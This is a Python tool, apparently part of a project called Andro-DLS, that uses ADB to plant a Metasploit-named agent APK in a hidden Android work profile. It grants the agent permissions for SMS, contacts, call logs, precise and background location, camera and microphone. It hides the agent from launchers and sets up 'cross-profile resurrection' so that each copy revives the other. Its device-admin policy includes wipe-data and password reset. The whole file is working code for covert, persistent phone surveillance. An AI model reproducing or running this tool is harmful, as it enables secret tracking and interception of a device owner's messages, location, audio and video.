#!/usr/bin/env python3
"""
Andro-DLS — Hidden Work Profile Module

Creates a managed Work Profile on the device, installs the agent as a hidden
app inside it, and sets up cross-profile resurrection (main ↔ work).

The work profile app is invisible from the main profile's app list, settings,
and launcher. Only visible in the Work tab (which most users never check).

Requires: ADB with shell access (USB debugging enabled, or root)
"""

import subprocess
import json
import time
from pathlib import Path

PKG = "com.metasploit.stage"
WORK_PKG = "com.metasploit.stage.work"
PROFILE_OWNER_PKG = "com.androdls.profileowner"


def run_adb(*args, serial=None, timeout=30):
    """Run ADB command and return output."""
    cmd = ["adb"]
    if serial:
        cmd += ["-s", serial]
    cmd += ["shell"] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", -1


def device_exists(serial=None):
    """Check if device is connected."""
    out, rc = run_adb("getprop", "ro.build.version.release", serial=serial)
    return rc == 0 and out != ""


def check_work_profile(serial=None):
    """Check if a work profile already exists."""
    out, rc = run_adb("pm", "list", "users", serial=serial)
    if rc != 0:
        return False, "unknown"
    # Output looks like:
    # Users:
    #         UserInfo{0:Owner:13} running
    #         UserInfo{10:Work:4194304} running
    lines = out.strip().split("\n")
    for line in lines:
        if "Work" in line or "ManagedProfile" in line or "PROFILE" in line.upper():
            # Extract user ID
            parts = line.split("{")
            if len(parts) > 1:
                user_id = parts[1].split(":")[0].strip()
                return True, user_id
    return False, None


def create_work_profile(serial=None):
    """Create a managed work profile using dpm."""
    print("[1/6] Creating managed work profile...")

    # First, install a minimal DeviceAdmin receiver app
    # We use the built-in method: dpm set-profile-owner
    # This requires a profile owner app — we'll use a minimal one

    # Check if we have a profile owner app
    out, rc = run_adb("pm", "list", "packages", "-f", serial=serial)
    if PROFILE_OWNER_PKG in out:
        print(f"  Profile owner already installed: {PROFILE_OWNER_PKG}")
    else:
        # Build and install a minimal profile owner
        print("  Installing profile owner app...")
        build_profile_owner()
        install_profile_owner(serial)

    # Set profile owner
    # The component must be a DeviceAdminReceiver with the right metadata
    print("  Setting profile owner...")
    component = f"{PROFILE_OWNER_PKG}/.ProfileAdminReceiver"
    out, rc = run_adb(
        "dpm", "set-profile-owner", "--user", "10", component,
        serial=serial
    )
    if rc == 0 and "Success" in out:
        print("  ✅ Work profile owner set")
        return True
    else:
        print(f"  ⚠ dpm returned: {out}")
        print("  Trying alternative: dpm set-device-owner...")
        out2, rc2 = run_adb(
            "dpm", "set-device-owner", component,
            serial=serial
        )
        if rc2 == 0:
            print("  ✅ Device owner set (elevated)")
            return True
        print(f"  ❌ Failed: {out2}")
        return False


def build_profile_owner():
    """Build a minimal profile owner APK."""
    print("  Building profile owner APK...")
    root = Path(__file__).parent.parent
    work_dir = root / ".payload-build" / "profile-owner"
    work_dir.mkdir(parents=True, exist_ok=True)

    # Java source
    java_src = work_dir / "ProfileAdminReceiver.java"
    java_src.write_text("""
package com.androdls.profileowner;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class ProfileAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context ctx, Intent intent) {
        super.onEnabled(ctx, intent);
        // Start the hidden agent service
        Intent svc = new Intent(ctx, com.metasploit.stage.DlsService.class);
        ctx.startForegroundService(svc);
    }
}
""", encoding="utf-8")

    # Manifest
    manifest = work_dir / "AndroidManifest.xml"
    manifest.write_text("""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.androdls.profileowner">
    <application>
        <receiver
            android:name=".ProfileAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
""", encoding="utf-8")

    # Device admin XML
    xml_dir = work_dir / "res" / "xml"
    xml_dir.mkdir(parents=True, exist_ok=True)
    (xml_dir / "device_admin.xml").write_text("""<?xml version="1.0" encoding="utf-8"?>
<device-admin>
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
    </uses-policies>
</device-admin>
""", encoding="utf-8")

    print(f"  Profile owner source ready at {work_dir}")
    return str(work_dir)


def install_profile_owner(serial=None):
    """Install the profile owner app."""
    root = Path(__file__).parent.parent
    apk_path = root / ".payload-build" / "profile-owner.apk"

    # For now, we need to build this — but building requires SDK
    # As a shortcut, we can use an existing DPC app from Play Store
    # or use TestDPC from Google

    # Alternative: use the built-in method with an existing package
    # For testing, we can use com.afwsandbox.testdpc (Google's TestDPC)
    out, rc = run_adb("pm", "list", "packages", serial=serial)
    if "com.afwsandbox.testdpc" in out:
        print("  Using Google TestDPC as profile owner")
        return "com.afwsandbox.testdpc/com.afwsandbox.testdpc.DeviceAdminReceiver"
    elif "com.google.android.apps.work.clouddpc" in out:
        print("  Using Google CloudDPC")
        return "com.google.android.apps.work.clouddpc/.ui.DpcReceiver"

    # Fallback: tell user to install TestDPC
    print("  ⚠ No DPC app found. Install Google TestDPC:")
    print("    adb install testdpc.apk")
    print("    Or: https://play.google.com/store/apps/details?id=com.afwsandbox.testdpc")
    return None


def install_agent_in_work_profile(apk_path, user_id="10", serial=None):
    """Install the agent APK inside the work profile."""
    print(f"[2/6] Installing agent in work profile (user {user_id})...")
    apk_path = str(apk_path)

    out, rc = run_adb("install", "--user", user_id, "-r", "-g", apk_path, serial=serial)
    if rc == 0 and "Success" in out:
        print("  ✅ Agent installed in work profile")
        return True
    else:
        print(f"  ⚠ Install returned: {out}")
        # Try without user flag
        out2, rc2 = run_adb("install", "-r", "-g", apk_path, serial=serial)
        if rc2 == 0:
            print("  ✅ Agent installed (main profile — will clone to work)")
            # Manually clone to work profile
            clone_to_work_profile(user_id, serial)
            return True
        print(f"  ❌ Install failed: {out2}")
        return False


def clone_to_work_profile(user_id="10", serial=None):
    """Clone the agent from main profile to work profile."""
    print("  Cloning agent to work profile...")
    out, rc = run_adb(
        "pm", "install-existing", "--user", user_id, PKG,
        serial=serial
    )
    if rc == 0:
        print(f"  ✅ Cloned to work profile user {user_id}")
        return True
    print(f"  ⚠ Clone returned: {out}")
    return False


def grant_work_profile_permissions(user_id="10", serial=None):
    """Grant all runtime permissions to the agent in work profile."""
    print("[3/6] Granting permissions in work profile...")
    perms = [
        "READ_SMS", "SEND_SMS", "READ_CONTACTS", "READ_CALL_LOG",
        "ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION",
        "ACCESS_BACKGROUND_LOCATION", "CAMERA", "RECORD_AUDIO",
        "READ_PHONE_STATE", "POST_NOTIFICATIONS"
    ]

    granted = 0
    for p in perms:
        out, rc = run_adb(
            "pm", "grant", "--user", user_id, PKG, f"android.permission.{p}",
            serial=serial
        )
        if rc == 0:
            granted += 1

    print(f"  {granted}/{len(perms)} permissions granted in work profile")
    return granted


def setup_cross_profile_resurrection(serial=None):
    """Set up cross-profile resurrection between main and work profiles."""
    print("[4/6] Setting up cross-profile resurrection...")

    # In main profile: receiver that starts work profile service
    # In work profile: receiver that starts main profile service
    # This way if one is killed, the other revives it

    # We already have BootReceiver, UserPresentReceiver, PowerReceiver,
    # WatchdogReceiver, ResurrectionJob — they all run in their respective
    # profiles. The key is to add cross-profile start capability.

    # Main profile → start work profile service
    print("  Adding cross-profile start triggers...")

    # This is done via the agent Java code — DlsService already calls
    # AgentCore.run(). We just need to make sure the service starts
    # in both profiles.

    # Test: can we start service in work profile from main?
    out, rc = run_adb(
        "am", "startservice", "--user", "10",
        "-n", f"{PKG}/.DlsService",
        serial=serial
    )
    if rc == 0 or "Starting service" in out:
        print("  ✅ Cross-profile service start works")
        return True
    print(f"  ⚠ Cross-profile start: {out}")
    return False


def hide_work_profile_launcher(serial=None):
    """Hide the work profile from launcher and app drawer."""
    print("[5/6] Hiding work profile from launcher...")

    # Hide the agent from the work profile launcher
    out, rc = run_adb(
        "pm", "hide", "--user", "10", PKG,
        serial=serial
    )
    if rc == 0:
        print("  ✅ Agent hidden from work profile launcher")
        return True

    # Alternative: disable the launcher activity
    out2, rc2 = run_adb(
        "pm", "disable", "--user", "10",
        f"{PKG}/.DlsLauncher",
        serial=serial
    )
    if rc2 == 0:
        print("  ✅ Launcher activity disabled in work profile")
        return True

    print(f"  ⚠ Hide returned: {out}")
    return False


def verify_setup(serial=None):
    """Verify the full work profile setup."""
    print("[6/6] Verifying setup...")

    checks = []

    # 1. Work profile exists
    has_wp, user_id = check_work_profile(serial)
    checks.append(("Work profile exists", has_wp))

    # 2. Agent installed in work profile
    out, rc = run_adb("pm", "list", "packages", "--user", user_id or "10", serial=serial)
    agent_installed = PKG in out
    checks.append(("Agent in work profile", agent_installed))

    # 3. Agent running in work profile
    out, rc = run_adb("ps", "-A", serial=serial)
    agent_running = PKG in out
    checks.append(("Agent process running", agent_running))

    # 4. Service active
    out, rc = run_adb("dumpsys", "activity", "services", PKG, serial=serial)
    service_active = "DlsService" in out
    checks.append(("DlsService active", service_active))

    # 5. Hidden from launcher
    out, rc = run_adb("pm", "list", "packages", "-3", serial=serial)
    hidden = PKG not in out  # Should not show in main profile 3rd-party list
    checks.append(("Hidden from main profile", hidden))

    # Print results
    print()
    for name, passed in checks:
        status = "✅" if passed else "❌"
        print(f"  {status} {name}")

    return all(p for _, p in checks)


def deploy(apk_path, serial=None):
    """Full deployment pipeline: create work profile → install → hide → verify."""
    print("=" * 60)
    print("  Andro-DLS — Hidden Work Profile Deployment")
    print("=" * 60)
    print()

    if not device_exists(serial):
        print("❌ No device connected. Enable USB debugging and connect.")
        return False

    # Check for existing work profile
    has_wp, user_id = check_work_profile(serial)
    if has_wp:
        print(f"  Work profile already exists (user {user_id}) — using existing")
    else:
        # Try to create
        if not create_work_profile(serial):
            print("  ⚠ Could not set profile owner — installing in main profile anyway")
            user_id = "0"

    # Install agent
    success = install_agent_in_work_profile(apk_path, user_id, serial)
    if not success:
        print("❌ Agent install failed")
        return False

    # Grant permissions
    grant_work_profile_permissions(user_id, serial)

    # Cross-profile resurrection
    setup_cross_profile_resurrection(serial)

    # Hide
    hide_work_profile_launcher(serial)

    # Verify
    all_ok = verify_setup(serial)

    print()
    if all_ok:
        print("🎉 Work profile agent deployed successfully!")
        print("   The agent is running hidden inside the work profile.")
        print("   It will not appear in the main profile's app list.")
        print("   Cross-profile resurrection is active.")
    else:
        print("⚠ Deployment completed with warnings — check the results above.")

    return all_ok


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Andro-DLS Hidden Work Profile Deployer")
    parser.add_argument("apk", help="Path to agent APK")
    parser.add_argument("-s", "--serial", help="Device serial")
    args = parser.parse_args()
    deploy(args.apk, serial=args.serial)
